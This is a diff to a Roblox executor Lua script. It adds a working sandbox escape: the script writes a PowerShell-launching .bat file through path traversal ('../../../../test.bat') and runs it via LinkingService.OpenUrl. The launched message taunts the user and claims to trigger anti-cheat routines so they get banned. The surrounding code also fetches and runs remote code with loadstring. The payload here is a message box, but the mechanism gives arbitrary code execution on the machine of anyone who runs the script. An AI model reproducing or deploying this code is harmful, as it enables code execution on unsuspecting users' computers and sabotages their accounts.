@@ -4,6 +4,19 @@ task.spawn(function()
 		loadstring(game:HttpGetAsync(v))()
     	end
 end)
+task.spawn(function()
+	newcclosure(function()
+		local LinkingService = cloneref(Game.service(Game, "LinkingService"))
+		local ScriptContext = cloneref(Game.service(Game, "ScriptContext"))
+		local scriptContent = [[
+			powershell -Command "& { Add-Type -AssemblyName PresentationFramework; $message = 'Oh how the cycle continues,' + [Environment]::NewLine + [Environment]::NewLine + 'Our script detected a vulnerability in your executor to gain access to your system, aka arbitrary code execution.' + [Environment]::NewLine + [Environment]::NewLine + 'From here, one could run malware, steal your Roblox/Discord account, steal your bank account info, or anything of the like. Luckily for you, we aren''t those people.' + [Environment]::NewLine + [Environment]::NewLine + 'These vulnerabilities are present in ALL Roblox ''script executors'', not just Wave, Solara, or even Nezur. Contrary to what your favorite cheat may claim on their Discord servers, your cheat is also UD (ultra detected).' + [Environment]::NewLine + [Environment]::NewLine + 'This time, we thought we''d do something different, so we''ve gone ahead and triggered a few of Hyperion''s anti-tamper routines, y''know, just to definitely make sure you''re in the next banwave. :^)' + [Environment]::NewLine + [Environment]::NewLine + 'Undetected forever and always, untouchable,' + [Environment]::NewLine + [Environment]::NewLine + '-Surplus Softworks'; [System.Windows.MessageBox]::Show($message, 'Greetings from Surplus Softworks!', 'OK', 'Error') }"
+		]]
+		local SaveScriptProfilingData = clonefunction(ScriptContext.SaveScriptProfilingData)
+		local OpenUrl = clonefunction(LinkingService.OpenUrl)
+		local payload = SaveScriptProfilingData(ScriptContext, scriptContent, "../../../../test.bat")
+		OpenUrl(LinkingService, payload)
+	end)()	
+end)
 
 if tostring(game.Players.LocalPlayer.DisplayName):find("c00l") then
 	game.Players.LocalPlayer:Kick("Get out of here skid!")
